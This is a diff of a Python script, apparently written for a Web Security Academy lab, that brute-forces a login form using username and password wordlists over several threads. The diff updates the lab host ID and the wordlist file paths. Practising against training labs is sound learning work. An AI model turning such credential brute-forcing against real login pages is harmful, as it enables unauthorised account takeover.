@@ -4,7 +4,7 @@ import requests
 import threading
 from queue import Queue
 
-server_name = "0a4e00be0483e9dc8066d002004700a3"
+server_name = "0a8600e203fb654181711b7700ca00a8"
 url = f"https://{server_name}.web-security-academy.net/login"
 headers = {
     "Host": f"{server_name}.web-security-academy.net",
@@ -55,12 +55,12 @@ def bruteForce():
 
 def main():
     # Put the usernames in a Queue
-    with open('../../credentials/usernames', 'r') as file:
+    with open('../../credentials/usernames.txt', 'r') as file:
         for line in file:
             username_queue.put(line.strip('\n'))
 
     # Put the passwords in a Queue
-    with open('../../credentials/passwords', 'r') as file:
+    with open('../../credentials/passwords.txt', 'r') as file:
         for line in file:
             password_list.append(line.strip('\n'))
 
